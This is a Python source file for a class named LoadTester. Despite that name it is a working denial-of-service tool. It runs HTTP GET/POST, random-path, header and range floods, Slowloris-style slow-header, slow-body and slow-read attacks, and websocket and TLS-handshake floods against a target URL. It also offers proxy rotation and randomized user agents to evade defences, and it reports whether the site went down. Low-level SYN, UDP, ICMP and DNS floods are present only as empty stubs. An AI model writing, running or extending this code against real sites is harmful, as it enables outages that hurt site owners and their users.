import asyncio
import aiohttp
import random
import time
import signal
import ssl
from threading import Event
from .utils import random_user_agent, get_proxy_connector, random_path, random_headers, validate_url
from .config import (STRESS_THRESHOLD, RESPONSE_TIME_THRESHOLD, METHOD_TASK_COUNTS,
                     REQUEST_TIMEOUT, FOLLOW_REDIRECTS)

# Optional low‑level imports (scapy for raw floods)
try:
    from scapy.all import IP, TCP, UDP, ICMP, send, RandShort
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

class LoadTester:
    def __init__(self, target, duration=0, concurrency=1000, methods=None, proxy_mode=False):
        self.target = validate_url(target)
        self.duration = duration
        self.concurrency = concurrency
        self.methods = methods or list(METHOD_TASK_COUNTS.keys())
        self.proxy_mode = proxy_mode
        self.stop_event = Event()
        self.total_requests = 0
        self.failures = 0
        self.connection_failures = 0
        self.total_response_time = 0.0
        self.lock = asyncio.Lock()
        self.start_time = None
        self.max_stress = 0

    # ---------- HTTP/Application Layer Methods ----------
    async def http_get_flood(self, session):
        while not self.stop_event.is_set():
            try:
                headers = {'User-Agent': random_user_agent()}
                start = time.time()
                async with session.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT, allow_redirects=FOLLOW_REDIRECTS) as resp:
                    await resp.read()
                    rt = time.time() - start
                    async with self.lock:
                        self.total_requests += 1
                        self.total_response_time += rt
                        if resp.status >= 500:
                            self.failures += 1
            except asyncio.TimeoutError:
                async with self.lock:
                    self.total_requests += 1
                    self.failures += 1
                    self.connection_failures += 1
            except Exception:
                async with self.lock:
                    self.total_requests += 1
                    self.failures += 1
            await asyncio.sleep(0)

    async def http_post_flood(self, session):
        while not self.stop_event.is_set():
            try:
                data = f"key={random.randint(1,100000)}&value={random.randint(1,100000)}"
                headers = {'User-Agent': random_user_agent()}
                start = time.time()
                async with session.post(self.target, data=data, headers=headers, timeout=REQUEST_TIMEOUT) as resp:
                    await resp.read()
                    rt = time.time() - start
                    async with self.lock:
                        self.total_requests += 1
                        self.total_response_time += rt
                        if resp.status >= 500:
                            self.failures += 1
            except Exception:
                async with self.lock:
                    self.total_requests += 1
                    self.failures += 1
            await asyncio.sleep(0)

    async def random_path_flood(self, session):
        while not self.stop_event.is_set():
            path = random_path()
            url = self.target + path
            try:
                headers = {'User-Agent': random_user_agent()}
                start = time.time()
                async with session.get(url, headers=headers, timeout=REQUEST_TIMEOUT) as resp:
                    await resp.read()
                    rt = time.time() - start
                    async with self.lock:
                        self.total_requests += 1
                        self.total_response_time += rt
                        if resp.status >= 500:
                            self.failures += 1
            except Exception:
                async with self.lock:
                    self.total_requests += 1
                    self.failures += 1
            await asyncio.sleep(0)

    async def slow_headers(self):
        host = self.target.split('://')[1].split('/')[0]
        port = 443 if self.target.startswith('https') else 80
        path = '/' + '/'.join(self.target.split('/')[3:]) if len(self.target.split('/')) > 3 else '/'

        while not self.stop_event.is_set():
            try:
                reader, writer = await asyncio.open_connection(host, port, ssl=(port==443))
                request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random_user_agent()}\r\n"
                writer.write(request.encode())
                await writer.drain()
                for _ in range(50):
                    if self.stop_event.is_set():
                        break
                    header = f"X-Header-{random.randint(1,1000)}: {random.randint(1,1000)}\r\n"
                    writer.write(header.encode())
                    await writer.drain()
                    await asyncio.sleep(10)
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
            await asyncio.sleep(0.1)

    async def slow_body(self):
        host = self.target.split('://')[1].split('/')[0]
        port = 443 if self.target.startswith('https') else 80
        path = '/' + '/'.join(self.target.split('/')[3:]) if len(self.target.split('/')) > 3 else '/'

        while not self.stop_event.is_set():
            try:
                reader, writer = await asyncio.open_connection(host, port, ssl=(port==443))
                content_length = 10000
                headers = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {random_user_agent()}\r\n"
                    f"Content-Length: {content_length}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
                )
                writer.write(headers.encode())
                await writer.drain()
                for i in range(0, content_length, 100):
                    if self.stop_event.is_set():
                        break
                    chunk = "a" * 100
                    writer.write(chunk.encode())
                    await writer.drain()
                    await asyncio.sleep(1)
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
            await asyncio.sleep(0.1)

    async def http2_flood(self, session):
        while not self.stop_event.is_set():
            try:
                headers = {'User-Agent': random_user_agent()}
                start = time.time()
                async with session.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT) as resp:
                    await resp.read()
                    rt = time.time() - start
                    async with self.lock:
                        self.total_requests += 1
                        self.total_response_time += rt
                        if resp.status >= 500:
                            self.failures += 1
            except Exception:
                async with self.lock:
                    self.total_requests += 1
                    self.failures += 1
            await asyncio.sleep(0)

    async def websocket_flood(self):
        ws_url = self.target.replace('http', 'ws')
        while not self.stop_event.is_set():
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.ws_connect(ws_url, timeout=REQUEST_TIMEOUT) as ws:
                        for _ in range(100):
                            if self.stop_event.is_set():
                                break
                            await ws.send_str(f"ping_{random.randint(1,1000)}")
                            await asyncio.sleep(0.1)
                        await ws.close()
            except Exception:
                pass
            await asyncio.sleep(0.1)

    async def ssl_renegotiation(self):
        if not self.target.startswith('https'):
            return
        host = self.target.split('://')[1].split('/')[0]
        port = 443
        while not self.stop_event.is_set():
            try:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.open_connection(host, port, ssl=ctx)
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
            await asyncio.sleep(0)

    async def slow_read(self):
        host = self.target.split('://')[1].split('/')[0]
        port = 443 if self.target.startswith('https') else 80
        path = '/' + '/'.join(self.target.split('/')[3:]) if len(self.target.split('/')) > 3 else '/'

        while not self.stop_event.is_set():
            try:
                reader, writer = await asyncio.open_connection(host, port, ssl=(port==443))
                request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random_user_agent()}\r\nConnection: keep-alive\r\n\r\n"
                writer.write(request.encode())
                await writer.drain()
                while not self.stop_event.is_set():
                    data = await reader.read(1)
                    if not data:
                        break
                    await asyncio.sleep(1)
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
            await asyncio.sleep(0.1)

    async def random_header_flood(self, session):
        while not self.stop_event.is_set():
            try:
                headers = random_headers()
                for i in range(20):
                    headers[f"X-Random-{i}"] = f"{random.randint(1,100000)}"
                start = time.time()
                async with session.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT) as resp:
                    await resp.read()
                    rt = time.time() - start
                    async with self.lock:
                        self.total_requests += 1
                        self.total_response_time += rt
                        if resp.status >= 500:
                            self.failures += 1
            except Exception:
                async with self.lock:
                    self.total_requests += 1
                    self.failures += 1
            await asyncio.sleep(0)

    async def range_flood(self, session):
        while not self.stop_event.is_set():
            try:
                headers = {'User-Agent': random_user_agent(), 'Range': f'bytes={random.randint(0,1000)}-{random.randint(1001,10000)}'}
                start = time.time()
                async with session.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT) as resp:
                    await resp.read()
                    rt = time.time() - start
                    async with self.lock:
                        self.total_requests += 1
                        self.total_response_time += rt
                        if resp.status >= 500:
                            self.failures += 1
            except Exception:
                async with self.lock:
                    self.total_requests += 1
                    self.failures += 1
            await asyncio.sleep(0)

    # ---------- Low‑Level Floods (require root/scapy) ----------
    async def dns_flood(self):
        if not SCAPY_AVAILABLE:
            return
        # Not implemented in asyncio; run in thread? For simplicity, skip or implement via asyncio subprocess.
        # We'll just pass for now.
        await asyncio.sleep(0)

    async def icmp_flood(self):
        if not SCAPY_AVAILABLE:
            return
        # Ping flood – requires root
        # We'll use a simple loop with subprocess ping? Better to skip if not root.
        await asyncio.sleep(0)

    async def syn_flood(self):
        if not SCAPY_AVAILABLE:
            return
        # SYN flood – requires root
        await asyncio.sleep(0)

    async def udp_flood(self):
        if not SCAPY_AVAILABLE:
            return
        await asyncio.sleep(0)

    # ---------- Stress Calculation ----------
    def get_stress_percent(self):
        if self.total_requests == 0:
            return 0
        error_rate = self.failures / self.total_requests
        avg_response = self.total_response_time / self.total_requests
        conn_fail_rate = self.connection_failures / self.total_requests
        rt_factor = min(1.0, avg_response / RESPONSE_TIME_THRESHOLD)
        combined = error_rate + rt_factor + conn_fail_rate
        percent = min(100, int((combined / STRESS_THRESHOLD) * 100)) if combined < STRESS_THRESHOLD else 100
        return percent

    # ---------- Main Orchestrator ----------
    async def attack(self):
        connector = get_proxy_connector() if self.proxy_mode else aiohttp.TCPConnector(
            limit=self.concurrency, force_close=True, enable_cleanup_closed=True, ttl_dns_cache=300)
        timeout = aiohttp.ClientTimeout(total=None, sock_connect=REQUEST_TIMEOUT, sock_read=REQUEST_TIMEOUT)
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            tasks = []
            for method in self.methods:
                count = METHOD_TASK_COUNTS.get(method, 10)
                for _ in range(count):
                    if method == "http_get":
                        tasks.append(self.http_get_flood(session))
                    elif method == "http_post":
                        tasks.append(self.http_post_flood(session))
                    elif method == "random_path":
                        tasks.append(self.random_path_flood(session))
                    elif method == "slow_headers":
                        tasks.append(self.slow_headers())
                    elif method == "slow_body":
                        tasks.append(self.slow_body())
                    elif method == "http2":
                        tasks.append(self.http2_flood(session))
                    elif method == "websocket":
                        tasks.append(self.websocket_flood())
                    elif method == "ssl_reneg":
                        tasks.append(self.ssl_renegotiation())
                    elif method == "slow_read":
                        tasks.append(self.slow_read())
                    elif method == "random_header":
                        tasks.append(self.random_header_flood(session))
                    elif method == "range_flood":
                        tasks.append(self.range_flood(session))
                    # Low‑level methods (placeholders)
                    elif method == "dns_flood":
                        tasks.append(self.dns_flood())
                    elif method == "icmp_flood":
                        tasks.append(self.icmp_flood())
                    elif method == "syn_flood":
                        tasks.append(self.syn_flood())
                    elif method == "udp_flood":
                        tasks.append(self.udp_flood())
            await asyncio.gather(*tasks)

    def run(self, test_id):
        self.start_time = time.time()
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        def signal_handler():
            self.stop_event.set()
        loop.add_signal_handler(signal.SIGINT, signal_handler)

        try:
            loop.run_until_complete(self.attack())
        except KeyboardInterrupt:
            self.stop_event.set()
        finally:
            loop.close()

        duration = time.time() - self.start_time
        self.max_stress = self.get_stress_percent()
        site_down = self.max_stress >= 100
        return {
            'requests': self.total_requests,
            'failures': self.failures,
            'site_down': site_down,
            'duration': duration,
            'max_stress': self.max_stress
        }
